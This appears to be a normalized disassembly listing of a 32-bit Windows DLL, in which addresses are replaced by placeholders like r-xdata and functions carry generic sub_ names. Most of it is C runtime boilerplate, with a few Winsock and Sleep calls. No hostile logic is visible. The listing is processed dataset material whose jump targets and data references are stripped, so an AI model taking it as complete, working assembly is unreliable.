lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
mov ecx [ ebp - 0xc ]
inc ecx
mov [ ebp + 0x10 ] ecx
mov [ eax + 0x8 ] ecx
mov ebx ecx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_1002ba45
push 0x8
push r--data
call sub_10020070
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_100200b5
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_1002bac0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1002baf4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10028fec
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_1001be03
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_10028fec
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_10028fec
push 0x1
mov edi eax
call sub_10028fec
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_10028f66
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_1002bb90
push 0x10
push r--data
call sub_10020070
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1001bdf0
and [ eax ] 0x0
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001bdf0
and [ eax ] 0x0
call sub_1001bddd
mov [ eax ] 0x9
call sub_1001ea75
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_100200b5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10029055
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1001bddd
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_1002baf4
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002bc4c
mov eax [ ebp - 0x1c ]
sub_1002bc54
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_1001a3eb
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_10001000
mov [ ecx ] r--data
jmp sub_10019c01
sub_10001040
retn
sub_10001070
xor eax eax
retn 0x4
sub_100010d6
lea ecx [ ebp - 0x1c ]
call sub_10019c01
mov eax sub_100010e4
retn
sub_100010e4
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10001155
lea ecx [ ebp - 0x1c ]
call sub_10019c01
mov eax sub_10001163
retn
sub_10001163
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10001180
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10019c51
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10001250
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x14 ] 0x8
mov [ ecx + 0x10 ] eax
jb r-xdata
mov [ ecx + eax * 2 ] dx
pop ebp
retn 0x4
mov ecx [ ecx ]
sub_100018f0
push ebp
mov ebp esp
mov edx [ ecx + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ ecx ]
mov [ eax + 0x4 ] 0x0
mov [ eax ] ecx
mov [ eax + 0x8 ] edx
pop ebp
retn 0x4
sub_10002220
push ebp
mov ebp esp
lea eax [ ebp + 0x8 ]
push eax
add ecx 0x8
call sub_10002060
pop ebp
retn 0x4
sub_1000268b
mov ecx [ ebp - 0x14 ]
call sub_100026a0
push 0x0
push 0x0
call sub_1001a898
int3
sub_10002e10
mov eax [ ecx + 0x4 ]
retn
sub_10002e20
mov eax [ ecx + 0x4 ]
mov ax [ eax ]
retn
sub_10002e30
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
mov cx [ ebp + 0x8 ]
mov [ eax ] cx
pop ebp
retn 0x4
sub_10002ea2
lea ecx [ ebp - 0x1c ]
call sub_10019c01
mov eax sub_10002eb0
retn
sub_10002eb0
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10002ed0
xor eax eax
retn
sub_10002ee0
mov eax [ ecx + 0x54 ]
retn
sub_10002ef0
mov eax [ ecx + 0x58 ]
retn
sub_10002f00
mov ecx [ ecx + 0x10 ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
jmp edx
sub_10002f20
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
push eax
call sub_1001a3eb
push esi
call sub_10019ce4
add esp 0x8
sub_10002f70
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x1
call edx
sub_100046c4
lea ecx [ ebp - 0x38 ]
call sub_10019c01
mov eax sub_100046d2
retn
sub_100046d2
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100048f1
mov ecx [ ebp - 0x14 ]
push ecx
call sub_10019ce4
add esp 0x4
push 0x0
push 0x0
call sub_1001a898
int3
sub_10004c73
mov eax [ ebp - 0x14 ]
push eax
call sub_10019ce4
add esp 0x4
push 0x0
push 0x0
call sub_1001a898
int3
sub_10005c7f
mov eax [ ebp - 0x14 ]
push eax
call sub_10019ce4
add esp 0x4
push 0x0
push 0x0
call sub_1001a898
int3
sub_10006cd0
push esi
mov esi ecx
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
mov [ esi ] 0x0
pop esi
retn
sub_10007f70
push esi
mov esi ecx
call sub_10006bc0
test eax eax
jne r-xdata
pop esi
retn
mov ecx esi
pop esi
jmp sub_10007ac0
sub_10009230
xor eax eax
push esi
mov esi ecx
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
call sub_10008e50
mov eax esi
pop esi
retn
sub_100092c0
mov [ ecx ] r--data
retn
sub_10009360
push ecx
mov [ ecx ] r--data
call sub_10019895
pop ecx
retn
sub_10009370
mov eax [ ecx - 0x10 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x10 ] r--data
retn
sub_10009380
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
mov eax [ ecx - 0x8 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x8 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
mov [ edx + ecx - 0x18 ] r--data
retn
sub_10009440
mov eax [ ecx ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
jmp eax
sub_10009490
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_100191ba
add esp 0x8
pop ebp
retn 0x4
sub_100094e0
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
add ecx 0x8
push ecx
push eax
call sub_100198d3
add esp 0x8
pop ebp
retn 0x4
sub_10009530
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_10009570
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x8
j_sub_10019c01
jmp sub_10019c01
sub_100096f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10019c51
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100098c0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
retn
push eax
call sub_1001a3eb
add esp 0x4
sub_10009960
add ecx 0x4
jmp sub_10019a16
sub_10009970
add ecx 0x4
jmp sub_10019a1f
sub_10009980
or eax 0xffffffff
retn 0x4
sub_10009990
xor eax eax
xor edx edx
retn
sub_100099a0
or eax 0xffffffff
retn
sub_100099b0
mov eax ecx
retn 0xc
sub_100099c0
retn 0x4
sub_100099d0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x30 ]
mov eax [ ecx ]
cdq
retn
sub_100099f0
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov ecx [ ecx + 0x34 ]
mov eax [ ecx ]
cdq
retn
sub_1000a4e8
mov ecx [ ebp - 0x18 ]
call sub_1000a390
push 0x0
push 0x0
call sub_1001a898
int3
sub_1000ae10
mov al [ ecx + 0xc ]
retn
sub_1000ae20
mov al [ ecx + 0xd ]
retn
sub_1000ae80
push esi
lea esi [ ecx + 0x60 ]
mov ecx esi
call sub_1000a740
push esi
mov [ esi ] r--data
call sub_10019895
add esp 0x4
pop esi
retn
sub_1000b083
mov eax r-xdata
retn
sub_1000ece0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_1000e2c0
xor eax eax
pop ebp
retn 0x4
sub_1000eea0
push esi
mov esi ecx
call sub_1000ed40
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
pop esi
retn
sub_1000f501
add esp 0x4
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1000f51a
lea ecx [ ebp - 0x1c ]
call sub_10019c01
mov eax sub_1000f528
retn
sub_1000f528
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1000f540
push 0xffffffff
call [ Sleep@IAT ]
xor eax eax
retn
sub_1000f790
push esi
mov esi ecx
call sub_10001b40
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
mov [ esi ] 0x0
pop esi
retn
sub_1000fe50
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x40 ] eax
pop ebp
retn 0x4
sub_10010161
mov edx [ ebp - 0x18 ]
push edx
lea ecx [ ebp - 0x30 ]
call sub_10019c51
push r--data
lea eax [ ebp - 0x30 ]
push eax
call sub_1001a898
int3
sub_10010a70
call WSACleanup
mov al 0x1
retn
sub_10010a80
mov al [ ecx + 0x40 ]
retn
sub_10013290
mov eax [ ecx + 0xc ]
push eax
call sub_10019ce4
pop ecx
retn
sub_100132a0
xor eax eax
cmp [ ecx + 0x34 ] eax
sete al
retn
sub_1001336b
mov eax [ ebp + 0x8 ]
push eax
call sub_10019ce4
add esp 0x4
push 0x0
push 0x0
call sub_1001a898
int3
sub_10015ef0
mov [ ecx ] r--data
retn
sub_10018d70
mov eax ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] 0x0
retn
sub_10018eca
lea ecx [ ebp - 0x24 ]
call sub_10019c01
mov eax sub_10018ed8
retn
WSAStartup
jmp [ WSAStartup@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
j_sub_10019c01#2
jmp sub_10019c01
sub_100190d7
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10019c51
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10019124
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10019c51
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10019171
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10019c51
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100191af
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1001a818
sub_10019327
mov edi edi
push esi
call sub_1001bc96
mov esi [ eax + 0x8 ]
call sub_1001bc70
mov edx eax
mov eax esi
pop esi
retn
sub_100193bf
mov eax [ ecx ]
cmp eax 0x4
jge r-xdata
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_10019ab0
pop ecx
sub_100193d6
mov ecx [ ecx + 0x4 ]
call sub_10009280
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_10019462
mov eax [ rw-data ]
retn
sub_10019753
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_100197a7
mov eax [ ecx + 0x4 ]
retn
sub_100197ab
mov eax [ ecx + 0x8 ]
retn
sub_100197af
mov eax rw-data
retn
sub_100199ff
mov edi edi
push esi
mov esi ecx
push [ esi ]
call sub_10019a90
push [ esi ]
call sub_10019ce4
pop ecx
pop ecx
pop esi
retn
sub_10019a16
push [ ecx ]
call sub_10019aa0
pop ecx
retn
sub_10019a1f
push [ ecx ]
call sub_10019ab0
pop ecx
retn
j_sub_1001cf4c
jmp sub_1001cf4c
sub_10019a6d
push r-xdata
call sub_1001b004
neg eax
sbb eax eax
pop ecx
and eax 0x18
retn
sub_10019a80
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ InitializeCriticalSection@IAT ]
pop ebp
retn
sub_10019a90
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_10019aa0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_10019ab0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10019af2
jmp r-xdata
cmp [ rw-data ] 0xa
jb r-xdata
mov eax [ rw-data ]
mov eax [ eax * 4 + rw-data ]
inc [ rw-data ]
push eax
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
retn
call eax
sub_10019b1d
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_10019b3a
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_10019b87
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_1001a3eb
pop ecx
sub_10019c01
mov [ ecx ] r--data
jmp sub_10019b87
sub_10019c76
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10019c51
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10019c93
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_1001db52
pop ecx
retn
sub_10019ce4
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1001a3eb
sub_1001a3c1
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_1001dd91
push 0x1
push 0x0
call sub_1001dad2
add esp 0xc
jmp sub_1001da9f
call eax
sub_1001a8e4
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10019ce4
sub_1001ab6d
call sub_1001e316
mov ecx [ eax + 0x6c ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
retn
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1001f0c5
sub_1001ac57
mov eax sub_1001fe8d
mov [ rw-data ] eax
mov [ rw-data ] sub_1001f583
mov [ rw-data ] sub_1001f537
mov [ rw-data ] sub_1001f570
mov [ rw-data ] sub_1001f4d9
mov [ rw-data ] eax
mov [ rw-data ] sub_1001fe05
mov [ rw-data ] sub_1001f4f5
mov [ rw-data ] sub_1001f457
mov [ rw-data ] sub_1001f3e3
retn
sub_1001acb7
mov edi edi
push ebp
mov ebp esp
call sub_1001ac57
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_1001fed3
sub_1001ad90
mov edi edi
push ebp
mov ebp esp
call sub_1001e29d
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
int3
push eax
call sub_1001e45f
pop ecx
sub_1001adaf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001aeae
mov edi edi
push ebp
mov ebp esp
call sub_1001e316
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_1001aec0
call sub_1001e316
mov ecx eax
mov eax [ ecx + 0x14 ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ ecx + 0x14 ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_1001affe
call sub_1001eb8b
retn
sub_1001b004
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1001afc8
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_1001b2ab
cmp [ ebp + 0x10 ] edi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_1001e1ac
sub_1001b409
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_10020045
pop ecx
pop ecx
retn
sub_1001b723
call sub_1001e316
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1001f0c5
sub_1001bc70
call sub_1001e316
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1001f0c5
sub_1001bc96
call sub_1001e316
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xc
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_1001f0c5
sub_1001be8f
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_1001bf76
push 0xd
call sub_10023ee6
pop ecx
retn
sub_1001bf82
push 0xc
call sub_10023ee6
pop ecx
retn
sub_1001cb64
push 0xc
call sub_10023ee6
pop ecx
retn
sub_1001cb70
push 0xc
call sub_10023ee6
pop ecx
retn
sub_1001cba1
and [ esi + 0x70 ] 0xffffffef
retn
sub_1001ce2b
push [ ebp - 0x14 ]
call sub_1001cd5e
pop ecx
retn
sub_1001ce6f
call sub_1001e316
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_1001e316
dec [ eax + 0x90 ]
sub_1001cf11
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_1001cf1a
mov esp [ ebp - 0x18 ]
call sub_1001e648
sub_1001cf4c
call sub_1001e316
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne al
retn
sub_1001cfd8
push 0x4
mov eax sub_1002df06
call sub_1001be59
call sub_1001e316
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1001e681
call sub_1001e694
sub_1001d0b1
mov eax [ ebp - 0x14 ]
call sub_1001ce89
retn
sub_1001d328
xor eax eax
inc eax
retn
sub_1001d32c
mov esp [ ebp - 0x18 ]
call sub_1001e648
sub_1001d3c1
xor eax eax
inc eax
retn
sub_1001d3c5
mov esp [ ebp - 0x18 ]
call sub_1001e648
sub_1001d8b8
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10019c51
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001dbb9
push 0xe
call sub_10023ee6
pop ecx
retn
sub_1001dd5b
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_1001e125
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001e134
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_1001e152
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
sub_1001e16f
call [ TlsAlloc@IAT ]
retn 0x4
sub_1001e28b
push 0xd
call sub_10023ee6
pop ecx
retn
sub_1001e294
push 0xc
call sub_10023ee6
pop ecx
retn
sub_1001e44a
push 0xd
call sub_10023ee6
pop ecx
retn
sub_1001e456
push 0xc
call sub_10023ee6
pop ecx
retn
sub_1001e648
push 0x8
push r--data
call sub_10020070
call sub_1001e316
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1001da9f
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001e668
xor eax eax
inc eax
retn
sub_1001e681
call sub_1001e316
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_1001e648
call eax
sub_1001e694
push 0x8
push r--data
call sub_10020070
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
call sub_1001e648
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001e6b8
xor eax eax
inc eax
retn
sub_1001e6cc
push sub_1001e648
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_1001e832
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001e8eb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_1001eb6a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_1001eb3f
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_1001eb82
push 0x8
call sub_10023fbf
pop ecx
retn
sub_1001eb8b
push 0x8
call sub_10023ee6
pop ecx
retn
sub_1001edad
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_10023ee6
pop ecx
sub_1001edc2
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1001ec82
add esp 0xc
pop ebp
retn
sub_1001edd8
push 0x1
push 0x0
push 0x0
call sub_1001ec82
add esp 0xc
retn
sub_1001ede7
mov edi edi
push ebp
mov ebp esp
call sub_1001df40
push [ ebp + 0x8 ]
call sub_1001dd91
pop ecx
push 0xff
call sub_1001edc2
int3
sub_1001f132
push 0xc
call sub_10023ee6
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_1001f537
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001f4f5
add esp 0x10
pop ebp
retn
sub_1001f570
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1001f3e3
pop ecx
pop ecx
pop ebp
retn
sub_1001f583
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1001f457
pop ecx
pop ecx
pop ebp
retn
sub_100200b5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_100224b7
push 0xd
call sub_10023ee6
pop ecx
retn
sub_10022886
push 0xd
call sub_10023ee6
pop ecx
retn
sub_100228bf
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_10022725
pop ecx
mov [ rw-data ] 0x1
sub_100228e0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10028cb0
sub_100228f6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10028cb0
sub_10023e42
xor eax eax
retn
sub_10023ee6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10023fb6
push 0xa
call sub_10023ee6
pop ecx
retn
sub_10025e30
mov eax rw-data
retn
sub_10025e36
mov eax rw-data
retn
sub_10025e3c
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_10025ee5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_10025f3a
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_100260ae
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_10023ee6
pop ecx
sub_100261c6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_100260f0
add esp 0xc
pop ebp
retn 0x4
sub_100261f9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_100267e5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_1002622b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_100260f0
add esp 0xc
pop ebp
retn 0x8
sub_100267b9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_100266f0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10026804
call eax
retn
sub_10026807
and [ rw-data ] 0x0
retn
sub_1002692b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_10026ac1
push [ ebp + 0x8 ]
call sub_100290f4
pop ecx
retn
sub_10027294
push ebx
call sub_100290f4
pop ecx
retn
sub_100273f2
call sub_10029383
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_1001a3eb
pop ecx
retn
call sub_1002915d
sub_10027516
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_100276d6
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1002769e
pop ecx
pop ecx
pop ebp
retn
sub_1002891f
push 0x2
call sub_1001ede7
sub_10028c24
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10028b0e
add esp 0x10
pop ebp
retn
sub_10028c91
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_10028c3e
add esp 0x10
pop ebp
retn
sub_10028e1b
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
